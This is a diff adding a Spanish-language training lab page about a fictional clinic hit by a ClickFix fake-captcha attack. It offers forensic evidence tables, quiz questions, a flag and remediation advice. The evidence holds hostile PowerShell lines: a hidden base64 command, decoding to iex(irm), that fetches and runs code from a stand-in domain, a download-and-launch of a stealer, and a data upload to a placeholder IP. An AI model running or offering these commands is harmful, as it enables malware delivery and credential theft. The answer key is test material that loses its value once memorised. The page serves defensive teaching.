@@ -1,0 +1,171 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>El captcha de la clínica · Labs N4zar1</title>
+<meta name="description" content="Reto de ClickFix: la recepcionista de una clínica siguió los pasos de un captcha falso y esa noche entraron en el correo. Revisa RunMRU, el evento 4104 y el router, y descubre qué pegó y adónde fueron los datos.">
+<meta name="theme-color" content="#040a1c">
+<link rel="icon" type="image/png" href="../assets/favicon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,500;12..96,800&family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@500;700&display=swap">
+<link rel="stylesheet" href="../assets/lab.css">
+<style>.evidence h3{margin:0;font:inherit}.evidence td{word-break:break-all}</style>
+</head>
+<body>
+<div class="wrap">
+  <header class="top">
+    <a class="brand" href="../index.html"><img class="b" src="../assets/avatar.jpg" alt="" width="40" height="40"><span><b>Laboratorios</b><span>LABS.N4ZAR1</span></span></a>
+    <nav><a href="../index.html">← Todos los labs</a></nav>
+  </header>
+
+  <span class="tag"><i></i>SIMULACIÓN · LABORATORIO</span>
+  <h1>🤖 El captcha de la clínica</h1>
+  <p class="lede">Medio · ~15 min · Basado en el vídeo «Este «No soy un robot» te hackea».</p>
+
+  <div class="brief">
+    <p><b>El caso.</b> Clínica dental Sonrisa Norte, ficticia. El martes 21/10, a las 10:42, Laura, de recepción, entra en la web de un proveedor para bajar una factura. Le sale «Verifica que eres humano» y, para terminar, unos pasos: <b>Windows + R</b>, <b>Ctrl + V</b> y <b>Enter</b>. Los sigue. Esa noche alguien entra en el correo de la clínica desde fuera. Te pasan cuatro pruebas de su PC y del router.</p>
+    <p><b>Tu misión:</b> averigua qué pegó Laura, qué hizo de verdad, adónde mandó los datos y qué se hace primero. Chuleta: <code>-w h</code> esconde la ventana, <code>-e</code> lleva el comando en base64 (UTF-16LE; en CyberChef, «From Base64» y luego «Decode text» UTF-16LE), <code>#</code> empieza un comentario que PowerShell no ejecuta. Ojo: no todo lo que dice «powershell» es el ataque.</p>
+  </div>
+
+  <div class="evidence" id="ev1">
+    <div class="hd"><h3>1 · reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU (PC de recepción)</h3>
+      <span class="tools"><input id="q1" placeholder="Buscar (letra, texto…)" aria-label="Buscar en RunMRU"><span class="count"></span></span></div>
+    <div class="scroll"><table><thead></thead><tbody></tbody></table></div>
+  </div>
+
+  <div class="evidence" id="ev2">
+    <div class="hd"><h3>2 · Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104}</h3>
+      <span class="tools"><select id="q2" aria-label="Filtrar por nivel"><option value="">Cualquier nivel</option><option>Advertencia</option><option>Detallado</option></select><span class="count"></span></span></div>
+    <div class="scroll"><table><thead></thead><tbody></tbody></table></div>
+  </div>
+
+  <div class="evidence" id="ev3">
+    <div class="hd"><h3>3 · Router de la clínica · registro del proxy, 21/10 de 10:40 a 10:45 (equipo 192.168.1.34, recepción)</h3>
+      <span class="tools"><input id="q3" placeholder="Buscar (dominio, IP, método…)" aria-label="Buscar en el registro del router"><span class="count"></span></span></div>
+    <div class="scroll"><table><thead></thead><tbody></tbody></table></div>
+  </div>
+
+  <div class="evidence" id="ev4">
+    <div class="hd"><h3>4 · Avisos de inicio de sesión de las cuentas de la clínica, 21/10</h3>
+      <span class="tools"><input id="q4" placeholder="Buscar (cuenta, IP, país…)" aria-label="Buscar en los avisos de inicio de sesión"><span class="count"></span></span></div>
+    <div class="scroll"><table><thead></thead><tbody></tbody></table></div>
+  </div>
+
+  <div class="tasks" id="tasks"></div>
+
+  <div class="win" id="win">
+    <h2>✓ Reto completado</h2>
+    <p>Bandera: <code id="flag"></code></p>
+    <p>Lo que haría el responsable: desconectar ya de la red el PC de recepción (sin apagarlo, para no perder pruebas), cambiar desde otro equipo las contraseñas que guardaba el navegador, empezando por el correo, y cerrar todas sus sesiones abiertas; bloquear captcha-check.example y 203.0.113.47 en el router, guardar los registros y avisar (INCIBE, 017). Después, reinstalar ese PC y activar el registro de bloques de script (4104) en todos los equipos. Y a todo el mundo, una regla: ninguna web de verdad te pide pulsar Windows + R.</p>
+    <button class="btn ghost" id="reset">Reiniciar el reto</button>
+  </div>
+
+  <footer class="foot"><span>Clínica, personas, dominios, IPs y cuentas ficticios. Por Nazarí · N4zar1</span><a href="../index.html">← Volver a los labs</a></footer>
+</div>
+<script src="../assets/lab.js"></script>
+<script>
+const $ = id => document.getElementById(id);
+const q = () => (r, v) => !v || r.join(' ').toLowerCase().includes(v.toLowerCase());
+
+makeTable({
+  el: $('ev1'),
+  cols: ['Nombre', 'Tipo', 'Datos'],
+  rows: [
+    ['a', 'REG_SZ', 'notepad\\1'],
+    ['b', 'REG_SZ', 'powershell Get-Printer\\1'],
+    ['c', 'REG_SZ', '\\\\192.168.1.20\\escaneos\\1'],
+    ['d', 'REG_SZ', 'powershell -w h -nop -e aQBlAHgAKABpAHIAbQAgACcAaAB0AHQAcABzADoALwAvAGMAYQBwAHQAYwBoAGEALQBjAGgAZQBjAGsALgBlAHgAYQBtAHAAbABlAC8AdgAuAHAAbgBnACcAKQA= # ✓ I am not a robot - reCAPTCHA Verification ID: 7291\\1'],
+    ['e', 'REG_SZ', 'mspaint\\1'],
+    ['f', 'REG_SZ', 'ms-settings:\\1'],
+    ['MRUList', 'REG_SZ', 'dbface'],
+  ],
+  filters: [{el: $('q1'), test: q()}],
+});
+
+makeTable({
+  el: $('ev2'),
+  cols: ['Hora', 'Nivel', 'ScriptBlock (texto)'],
+  rows: [
+    ['14/10 09:20:41', 'Detallado', 'Get-Printer'],
+    ['14/10 09:21:10', 'Detallado', 'prompt'],
+    ['20/10 08:01:12', 'Detallado', '& "C:\\Program Files\\SonriDent\\actualizar.ps1" -Silencioso'],
+    ['20/10 08:01:13', 'Detallado', '$v = Get-ItemProperty HKLM:\\SOFTWARE\\SonriDent; if ($v.Version -lt "4.2") { Start-Process "C:\\Program Files\\SonriDent\\update.exe" }'],
+    ['21/10 07:58:30', 'Detallado', 'Get-MpComputerStatus | Select-Object AntivirusEnabled, AntivirusSignatureVersion'],
+    ['21/10 10:43:07', 'Advertencia', "iex(irm 'https://captcha-check.example/v.png')"],
+    ['21/10 10:43:08', 'Advertencia', '$d = "$env:APPDATA\\Microsoft\\Crypto\\svchelper.exe"; iwr \'https://captcha-check.example/s.bin\' -OutFile $d -UseBasicParsing; Start-Process $d -WindowStyle Hidden'],
+    ['21/10 13:15:44', 'Detallado', 'Get-MpComputerStatus | Select-Object AntivirusEnabled, AntivirusSignatureVersion'],
+  ],
+  filters: [{el: $('q2'), test: (r, v) => !v || r[1] === v}],
+});
+
+makeTable({
+  el: $('ev3'),
+  cols: ['Hora', 'Destino', 'IP', 'Método · ruta', 'Enviado', 'Recibido'],
+  rows: [
+    ['10:40:02', 'citas.sonrident.example', '192.0.2.40', 'POST /api/agenda', '1,2 KB', '8,4 KB'],
+    ['10:41:15', 'www.google.com', '142.250.184.4', 'GET /search', '0,9 KB', '64 KB'],
+    ['10:42:03', 'pedidos-dentalpro.example', '192.0.2.77', 'GET /facturas/2026-10', '0,8 KB', '22 KB'],
+    ['10:42:04', 'verify-human-check.example', '198.51.100.23', 'GET /', '0,7 KB', '31 KB'],
+    ['10:42:20', 'settings-win.data.microsoft.com', '20.42.65.90', 'POST /settings', '2,1 KB', '1,4 KB'],
+    ['10:43:07', 'captcha-check.example', '198.51.100.23', 'GET /v.png', '0,6 KB', '1,1 KB'],
+    ['10:43:08', 'captcha-check.example', '198.51.100.23', 'GET /s.bin', '0,6 KB', '9,8 MB'],
+    ['10:43:31', '203.0.113.47', '203.0.113.47', 'POST /upload', '2,3 MB', '0,2 KB'],
+    ['10:44:10', 'citas.sonrident.example', '192.0.2.40', 'POST /api/agenda', '1,1 KB', '8,2 KB'],
+    ['10:44:52', 'outlook.office365.com', '52.97.146.18', 'GET /owa', '1,8 KB', '120 KB'],
+  ],
+  filters: [{el: $('q3'), test: q()}],
+});
+
+makeTable({
+  el: $('ev4'),
+  cols: ['Hora', 'Cuenta', 'Desde', 'Resultado'],
+  rows: [
+    ['08:02', 'Correo de la clínica (recepcion@sonrisanorte.example)', '192.168.1.34 · la clínica', 'Correcto'],
+    ['09:15', 'Programa de citas SonriDent', '192.168.1.34 · la clínica', 'Correcto'],
+    ['13:40', 'Banco de la clínica', '192.168.1.12 · la clínica (gerencia)', 'Correcto, con código del móvil'],
+    ['22:15', 'Correo de la clínica (recepcion@sonrisanorte.example)', '203.0.113.80 · Países Bajos', 'Correcto'],
+    ['22:17', 'Correo de la clínica (recepcion@sonrisanorte.example)', '203.0.113.80 · Países Bajos', 'Regla nueva: reenviar todo a pagos.sonrisanorte@mail.example'],
+    ['23:02', 'Banco de la clínica', '203.0.113.80 · Países Bajos', 'Denegado: falta el código del móvil'],
+  ],
+  filters: [{el: $('q4'), test: q()}],
+});
+
+runLab('captcha-ofuscado', [
+  {q: '¿Qué entrada de RunMRU es la que pegó Laura? (la letra)', type: 'text', ph: 'Una letra',
+   accept: a => norm(a).replace(/[^a-z]/g, '') === 'd',
+   hint: 'Busca la que lleva opciones raras y un texto que parece de captcha.',
+   explain: 'La <b>d</b>. Es la primera de <code>MRUList</code> (<code>dbface</code>): la última que se ejecutó. Lleva <code>-w h</code> (ventana oculta), <code>-nop</code> (sin perfil) y <code>-e</code> con el comando en base64. Es lo que la web había copiado en su portapapeles.'},
+  {q: 'La entrada «b» también es PowerShell. ¿Es parte del ataque?', type: 'choice',
+   options: ['Sí: cualquier PowerShell en RunMRU es malo', 'No: es Get-Printer, visible y sin nada escondido; según el 4104 se ejecutó el 14/10 (el técnico, por teléfono), una semana antes', 'Sí: Get-Printer roba las contraseñas de la impresora'], correct: 1,
+   wrong: '✗ Mira qué hace Get-Printer y cuándo aparece en el 4104.',
+   explain: '<b>No.</b> <code>Get-Printer</code> solo lista las impresoras, la ventana no se esconde y no hay nada codificado. El 4104 la sitúa el 14/10, una semana antes. Es la trampa: lo que delata el ataque no es la palabra «powershell», sino <code>-w h</code>, <code>-e</code> y una URL que no escribiste tú.'},
+  {q: 'En la ventana Ejecutar, Laura solo vio «✓ I am not a robot - reCAPTCHA Verification ID: 7291». ¿Por qué?', type: 'choice',
+   options: ['Porque es un comentario (#) al final de la línea: PowerShell no lo ejecuta, y como el cuadro enseña el final de lo pegado, solo se ve eso', 'Porque Windows esconde los comandos de PowerShell', 'Porque el base64 se convierte en ese texto al pegarlo'], correct: 0,
+   wrong: '✗ Mira qué hay justo antes de «✓ I am not a robot».',
+   explain: 'Todo lo que va detrás de <code>#</code> es un <b>comentario</b>: PowerShell lo ignora. Los atacantes lo ponen al final para que el cuadro de Ejecutar, que enseña el final del texto pegado, solo muestre algo que parece de un captcha. El comando de verdad queda fuera de la vista, a la izquierda.'},
+  {q: '¿De qué dominio descarga el código? (decodifica el base64 o búscalo)', type: 'text', ph: 'dominio.example',
+   accept: a => norm(a).includes('captcha-check.example'),
+   hint: 'Base64 → UTF-16LE. O mira qué guardó el 4104 a las 10:43:07.',
+   explain: '<b>captcha-check.example</b>. El base64 decodificado es <code>iex(irm \'https://captcha-check.example/v.png\')</code>: <code>irm</code> descarga y <code>iex</code> ejecuta lo descargado, sin tocar el disco. Ojo: no es el mismo dominio de la web del captcha (<code>verify-human-check.example</code>), aunque los dos están en 198.51.100.23. El 4104 lo guarda ya traducido: por eso conviene tenerlo activado.'},
+  {q: '¿Con qué nombre deja el programa en el disco?', type: 'text', ph: 'nombre.exe',
+   accept: a => norm(a).includes('svchelper'),
+   hint: 'Es lo que hace el v.png: está en el 4104 un segundo después.',
+   explain: '<b>svchelper.exe</b>, en <code>%APPDATA%\\Microsoft\\Crypto\\</code>: un nombre y una carpeta que parecen de Windows. El v.png no era una imagen: era otro script que baja <code>s.bin</code> (9,8 MB en el router) y lo arranca oculto. Es el ladrón de contraseñas.'},
+  {q: '¿A qué IP manda los datos robados?', type: 'text', ph: '0.0.0.0',
+   accept: a => a.replace(/\s/g, '').includes('203.0.113.47'),
+   hint: 'En el router: lo que sale con muchos más bytes enviados que recibidos.',
+   explain: '<b>203.0.113.47</b>: a las 10:43:31, 23 segundos después de arrancar, un <code>POST /upload</code> de 2,3 MB. Para una recepcionista, mandar 2,3 MB a una IP sin nombre es raro: son las contraseñas y cookies del navegador, empaquetadas.'},
+  {q: '¿En qué cuenta entraron esa noche desde fuera?', type: 'choice',
+   options: ['En el banco de la clínica', 'En el correo de la clínica, y dejaron una regla para reenviar todo a otra dirección', 'En el programa de citas'], correct: 1,
+   wrong: '✗ Mira qué inicios de sesión de las 22:00 en adelante salieron bien.',
+   explain: 'En el <b>correo</b> (recepcion@sonrisanorte.example), a las 22:15 desde Países Bajos, con la contraseña robada. A las 22:17 crean una regla que reenvía todo a <code>pagos.sonrisanorte@mail.example</code>: así siguen leyendo aunque cambies la contraseña, y pueden mandar facturas falsas a los pacientes. El banco aguantó porque pedía el código del móvil.'},
+  {q: 'Eres el responsable de la clínica. ¿Qué haces primero?', type: 'choice',
+   options: ['Pasar el antivirus y seguir trabajando', 'Desconectar de la red el PC de recepción, cambiar desde otro equipo la contraseña del correo, cerrar sus sesiones y borrar la regla de reenvío, guardar pruebas y avisar (017)', 'Cambiar la contraseña del correo desde el mismo PC de recepción'], correct: 1,
+   explain: '<b>Aislar, recuperar las cuentas desde otro equipo y guardar pruebas.</b> Si cambias la contraseña desde el PC infectado, el ladrón se lleva la nueva. Hay que cerrar todas las sesiones y <b>borrar la regla de reenvío</b>, o seguirán leyendo el correo. Después: avisar (INCIBE, 017), revisar si salieron facturas falsas a pacientes y reinstalar el PC.'},
+], 'N4{el_captcha_te_usaba_de_robot}');
+</script>
+<script data-goatcounter="https://n4zar1.goatcounter.com/count" async src="https://gc.zgo.at/count.js"></script>
+</body>
+</html>
